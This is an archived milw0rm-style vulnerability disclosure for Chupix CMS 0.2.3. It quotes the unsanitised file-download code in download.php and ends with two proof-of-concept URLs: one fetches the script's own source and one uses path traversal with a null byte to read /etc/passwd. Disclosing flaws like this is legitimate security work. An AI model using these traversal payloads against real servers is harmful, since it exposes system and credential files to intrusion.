<html><head><title>Chupix CMS 0.2.3 (download.php) Remote File Disclosure Vulnerability</title></head><pre># Chupix CMS 0.2.3 (download.php) Remote File Download Vulnerability
# P.Script : http://sourceforge.net/project/showfiles.php?group_id=134930
################################download.php################################
Lain:18-&gt;57 -&gt;
********************************************************************************************************************
if(isset($_GET['fichier'])){ &lt;--------------XXXX                             
                                       *
		// téléchargement du fichier                                               
                         *
		$file = &quot;archives/&quot;. $_GET['repertoire'] .&quot;/&quot;. 
$_GET['fichier'];&lt;--------------XXXX                *
		$fichier_txt = &quot;archives/&quot;. $_GET['repertoire'] .&quot;/cpt/&quot;. $_GET['fichier'] 
.&quot;.php&quot;                 *
		$repertoire = &quot;archives/&quot;. $_GET['repertoire'] .&quot;/cpt/&quot;;                   
                         *
		if(is_file($fichier_txt)){                                                 
                         *
			$fp           =   @fopen($fichier_txt, &quot;r&quot;);  &lt;--------------XXXX         
                  *
			$result       =   fread($fp, filesize ($fichier_txt));                    
                  *
			fclose($fp);                                                              
                  *
			$result       =   str_replace(&quot;&lt;?php &quot;, &quot;&quot;, $result);                     
                  *
			$result       =   str_replace(&quot;?&gt;&quot;, &quot;&quot;, $result);                         
                  *
		                                                                           
                         *
			$num = trim($result);                                                     
                  *
		}else{                                                                     
                         *
			$num = 0;                                                                 
                  *
		}                                                                          
                         *
		$num++;                                                                    
                         *
		                                                                           
                         *
		$msg = &quot;&lt;?php &quot;. $num .&quot; ?&gt;&quot;;                                              
                         *
		                                                                           
                         *
		if(!(is_dir($repertoire))){                                                
                         *
			mkdir ($repertoire, 0755);                                                
                  *
		}                                                                          
                         *
		                                                                           
                         *
		$fp  =   @fopen($fichier_txt, &quot;w+&quot;);&lt;--------------XXXX                    
                         *
	  	if (flock($fp, LOCK_EX)) { // pose un verrou exclusif                    
                           *
    		fwrite($fp, $msg);                                                     
                             *
   			flock($fp, LOCK_UN); // libère le verrou                               
                     *
		}else{                                                                     
                         *
    		echo &quot;Impossible de verrouiller le fichier &lt;font color=\&quot;maroon\&quot;&gt;&quot;. 
$fichier .&quot;&lt;/font&gt;&quot;;          *
		}                                                                          
                         *
   	 	fclose($fp);                                                           
                             *
   	                               	                                         
                                   *                                         
                                                           *
   	 	                                                                       
                             *
		                                                                           
                         *
		header(&quot;Content-type: application/force-download&quot;);                        
                         *
		header(&quot;Content-Disposition: attachment; filename=&quot;.$_GET['fichier']);     
                         *
		readfile($file);&lt;--------------XXXX                                        
                         *
}                                                                            
                                       *
********************************************************************************************************************
# POC:
      /download.php?repertoire=defaut&amp;fichier=../../download.php
      /download.php?fichier=../../../../../../../etc/passwd%00
# Discovered by: GoLd_M
# SP.TanX = Tryag.Com &amp; Asb-May.Net &amp; Milw0rm.Com

# milw0rm.com [2007-09-15]</pre></html>